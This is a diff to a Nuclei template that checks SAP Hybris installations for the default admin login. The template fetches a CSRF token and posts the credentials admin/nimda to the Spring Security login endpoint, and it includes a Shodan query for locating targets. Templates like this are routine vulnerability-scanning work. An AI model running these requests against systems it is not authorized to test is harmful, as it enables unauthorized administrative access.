@@ -1,5 +1,6 @@
 http:
-- attack: clusterbomb
+- attack: pitchfork
+  cookie-reuse: true
   extractors:
   - group: 1
     internal: true
@@ -8,7 +9,6 @@ http:
     regex:
     - <meta name="_csrf" content="([a-z0-9-]+)" \/>
     type: regex
-  host-redirects: true
   matchers:
   - condition: and
     type: word
@@ -19,23 +19,18 @@ http:
     - 200
     type: status
   matchers-condition: and
-  max-redirects: 2
   payloads:
     password:
     - nimda
-    path:
-    - /
-    - /hac/
-    - /hmc/
     username:
     - admin
   raw:
-  - 'GET {{path}}login HTTP/1.1
+  - 'GET /login HTTP/1.1
 
     Host: {{Hostname}}
 
     '
-  - 'POST {{path}}j_spring_security_check HTTP/1.1
+  - 'POST /j_spring_security_check HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -49,18 +44,15 @@ http:
     j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}
 
     '
-  - 'GET {{path}} HTTP/1.1
+  - 'GET / HTTP/1.1
 
     Host: {{Hostname}}
 
     '
-  skip-variables-check: true
-  stop-at-first-match: true
 id: hybris-default-login
 info:
   author: princechaddha
   classification:
-    cpe: cpe:2.3:a:sap:hybris:*:*:*:*:*:*:*:*
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
     cvss-score: 8.3
     cwe-id: CWE-522
@@ -69,11 +61,8 @@ info:
     execute unauthorized operations.
   metadata:
     max-request: 3
-    product: hybris
-    runzero-match: any(each(service["html.titles"]), {# matches "Hybris"})
     shodan-query: title:"Hybris"
-    vendor: sap
     verified: true
   name: Hybris - Default Login
   severity: high
-  tags: default-login,hybris,vuln
+  tags: default-login,hybris
